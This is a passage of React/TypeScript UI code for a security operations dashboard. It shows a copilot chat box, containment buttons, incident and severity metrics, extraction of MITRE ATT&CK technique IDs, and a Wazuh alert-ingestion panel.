                                confirmContainment(focusedIncident.id, focusedIncident.agent_name, 'block_ip');
                              } else {
                                sendPrompt(`Execute action: ${act}`);
                              }
                            }}
                          >
                            ⚡ {act}
                          </Button>
                        ))}
                      </div>
                    )}
                  </div>
                ))}

                {copilotChat.isPending && (
                  <div className="chatgpt-msg-row chatgpt-msg-assistant">
                    <div className="chatgpt-bubble-assistant" style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                      <Spin size="small" />
                      <span style={{ fontSize: 12 }}>Consulting telemetry and CTI sources...</span>
                    </div>
                  </div>
                )}
              </div>

              {/* CHATGPT INPUT AREA (PINNED BOTTOM) */}
              <div className="chatgpt-input-area">
                <div className="chatgpt-prompt-box">
                  <Input.TextArea
                    rows={2}
                    className="chatgpt-textarea"
                    placeholder="Ask Copilot anything about live incidents, malware IOCs, MITRE ATT&CK, or containment... (Enter to send)"
                    value={chatInput}
                    onChange={e => setChatInput(e.target.value)}
                    onKeyDown={e => {
                      if (e.key === 'Enter' && !e.shiftKey) {
                        e.preventDefault();
                        sendPrompt();
                      }
                    }}
                  />
                  <div className="chatgpt-input-footer" style={{ justifyContent: 'flex-end', gap: 8 }}>
                    <Button
                      type="primary"
                      size="small"
                      loading={copilotChat.isPending}
                      onClick={() => sendPrompt()}
                      style={{ fontWeight: 600 }}
                    >
                      Send ↑
                    </Button>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* ═════════════════════════════════════════════════════════════════════
              COLUMN 3: 100% REAL TELEMETRY & OPERATIONS SUMMARY (~26%)
             ═════════════════════════════════════════════════════════════════════ */}
          <div className="hud-col-right">
            {/* REAL-TIME OPERATIONS STATS */}
            <section className="panel hud-panel">
              <div className="panel-heading" style={{ marginBottom: 8 }}>
                <h3 style={{ margin: 0, fontSize: 13, fontWeight: 600 }}>Operational Metrics</h3>
              </div>

              <div className="hud-telemetry-row">
                <div>
                  <span className="hud-stat-title">Open Incidents</span>
                  <div className="hud-stat-number" style={{ color: openIncidents.length > 0 ? '#e76f51' : '#a4dfba' }}>
                    {openIncidents.length}
                  </div>
                </div>
                <div style={{ fontSize: 11, color: 'var(--text-muted)' }}>
                  {openIncidents.filter(t => t.severity === 'critical').length} Critical
                </div>
              </div>

              <div className="hud-telemetry-row">
                <div>
                  <span className="hud-stat-title">Under Investigation</span>
                  <div className="hud-stat-number" style={{ color: '#e9c46a' }}>
                    {data.filter(t => t.status === 'INVESTIGATING').length}
                  </div>
                </div>
                <div style={{ fontSize: 11, color: 'var(--text-muted)' }}>Active triage</div>
              </div>

              <div className="hud-telemetry-row">
                <div>
                  <span className="hud-stat-title">Resolved / Contained</span>
                  <div className="hud-stat-number" style={{ color: '#2a9d8f' }}>
                    {data.filter(t => t.status === 'RESOLVED').length}
                  </div>
                </div>
                <div style={{ fontSize: 11, color: 'var(--text-muted)' }}>Total closed</div>
              </div>

              <div className="hud-telemetry-row">
                <div>
                  <span className="hud-stat-title">Total Ingested Alerts</span>
                  <div className="hud-stat-number">{data.length}</div>
                </div>
                <div style={{ fontSize: 11, color: 'var(--text-muted)' }}>From SIEM</div>
              </div>
            </section>

            {/* REAL SEVERITY BREAKDOWN */}
            <section className="panel hud-panel">
              <div className="panel-heading" style={{ marginBottom: 6 }}>
                <h3 style={{ margin: 0, fontSize: 13, fontWeight: 600 }}>Severity Distribution</h3>
              </div>

              {data.length === 0 ? (
                <div style={{ textAlign: 'center', padding: '16px 0', color: 'var(--text-muted)', fontSize: 11 }}>
                  No telemetry recorded.
                </div>
              ) : (
                <div style={{ display: 'flex', flexDirection: 'column', gap: 6, marginTop: 4 }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: 11 }}>
                    <span style={{ color: '#f43f5e', fontWeight: 600 }}>Critical (P1)</span>
                    <span className="mono">{data.filter(t => t.severity === 'critical').length}</span>
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: 11 }}>
                    <span style={{ color: '#fb923c', fontWeight: 600 }}>High (P2)</span>
                    <span className="mono">{data.filter(t => t.severity === 'high').length}</span>
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: 11 }}>
                    <span style={{ color: '#facc15', fontWeight: 600 }}>Medium (P3)</span>
                    <span className="mono">{data.filter(t => t.severity === 'medium').length}</span>
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: 11 }}>
                    <span style={{ color: '#38bdf8', fontWeight: 600 }}>Low (P4)</span>
                    <span className="mono">{data.filter(t => t.severity === 'low').length}</span>
                  </div>
                </div>
              )}

              {/* OBSERVED ATT&CK TECHNIQUES */}
              <div style={{ marginTop: 12, borderTop: '1px solid #1f2d29', paddingTop: 8 }}>
                <small className="eyebrow" style={{ display: 'block', marginBottom: 4 }}>OBSERVED ATT&amp;CK TECHNIQUES</small>
                {Array.from(new Set(data.map(t => (t as any).mitre || (t.rule_description?.match(/T\d{4}/)?.[0])).filter(Boolean))).length > 0 ? (
                  <div style={{ display: 'flex', gap: 4, flexWrap: 'wrap' }}>
                    {Array.from(new Set(data.map(t => (t as any).mitre || (t.rule_description?.match(/T\d{4}/)?.[0])).filter(Boolean))).map((tech, idx) => (
                      <Tag key={idx} color="volcano" style={{ fontSize: 9 }}>{tech}</Tag>
                    ))}
                  </div>
                ) : (
                  <div style={{ fontSize: 10, color: 'var(--text-muted)' }}>No active techniques mapped yet.</div>
                )}
              </div>
            </section>

            {/* INGESTION CONNECTOR STATUS */}
            <section className="panel hud-panel">
              <div className="panel-heading" style={{ marginBottom: 6 }}>
                <h3 style={{ margin: 0, fontSize: 13, fontWeight: 600 }}>Pipeline Ingestion</h3>
                <Tag color={system?.integrations.some(item => item.id === 'wazuh' && item.configured) ? 'green' : 'default'}>{system?.integrations.some(item => item.id === 'wazuh' && item.configured) ? 'CONFIGURED' : 'NOT CONFIGURED'}</Tag>
              </div>
              <p className="muted" style={{ fontSize: 11, margin: '0 0 10px 0' }}>
                Wazuh-compatible alerts can be submitted through the authenticated ingestion endpoint. Connector health is not verified here.
              </p>
              <Button block size="small" onClick={() => setIngestOpen(true)}>
                Dispatch Test Payload
              </Button>
            </section>
          </div>
        </div>
      )}

      {/* INCIDENT DETAIL DRAWER (IF OPENED VIA ROUTE) */}
      {ticketId && (
        <IncidentDetail
          key={`${orgId}-${ticketId}`}
          id={ticketId}
          close={() => navigate('/' + (params.size ? `?${params}` : ''))}
        />
      )}

      {/* INGEST TEST ALERT MODAL */}
      <IngestModal open={ingestOpen} close={() => setIngestOpen(false)} />
    </div>
  );
}
